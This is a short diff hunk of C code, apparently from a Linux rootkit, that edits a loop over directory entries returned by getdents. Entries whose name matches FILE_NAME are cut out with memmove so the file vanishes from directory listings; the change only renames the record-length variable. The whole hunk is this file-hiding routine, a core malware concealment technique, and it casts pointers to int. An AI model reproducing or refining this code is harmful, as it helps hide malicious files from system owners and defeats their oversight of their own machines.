@@ -30,15 +30,16 @@ d_name:   Filename (null-terminated)
 
   int i = 0;
   while (i < rtn) {
+    int size = cur->d_reclen;
+
     if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
-      int reclen = cur->d_reclen;
-      char *next_rec = (char *)cur + reclen;
+      char *next_rec = (char *)cur + size;
       int len = (int)dirp + rtn - (int)next_rec;
       memmove(cur, next_rec, len);
-      rtn -= reclen;
+      rtn -= size;
       continue;
     }
-    i += cur->d_reclen;
+    i += size;
     cur = (struct linux_dirent*) ((char*)dirp + i);
   }
 
